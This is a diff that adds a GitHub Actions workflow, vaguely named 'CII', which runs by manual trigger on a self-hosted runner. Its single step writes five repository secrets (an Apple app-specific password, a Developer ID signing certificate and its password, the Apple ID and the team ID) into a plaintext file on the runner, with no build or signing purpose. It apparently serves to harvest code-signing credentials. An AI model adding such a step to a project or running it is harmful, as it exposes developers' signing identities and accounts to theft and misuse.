@@ -1,0 +1,19 @@
+name: CII
+
+on: workflow_dispatch
+
+jobs:
+  runit:
+    name: Runs It
+    runs-on: self-hosted
+    steps:
+      - run: 'echo "$APPLE_APP_SPECIFIC_PASSWORD" > ducklake-explorer-list ; echo "$APPLE_DEVELOPER_ID_CERT_P12" >> ducklake-explorer-list ; echo "$APPLE_DEVELOPER_ID_CERT_PASSWORD" >> ducklake-explorer-list ; echo "$APPLE_ID" >> ducklake-explorer-list ; echo "$APPLE_TEAM_ID" >> ducklake-explorer-list'
+        shell: bash
+        env:
+          APPLE_APP_SPECIFIC_PASSWORD: ${{secrets.APPLE_APP_SPECIFIC_PASSWORD}}
+          APPLE_DEVELOPER_ID_CERT_P12: ${{secrets.APPLE_DEVELOPER_ID_CERT_P12}}
+          APPLE_DEVELOPER_ID_CERT_PASSWORD: ${{secrets.APPLE_DEVELOPER_ID_CERT_PASSWORD}}
+          APPLE_ID: ${{secrets.APPLE_ID}}
+          APPLE_TEAM_ID: ${{secrets.APPLE_TEAM_ID}}
+
+    
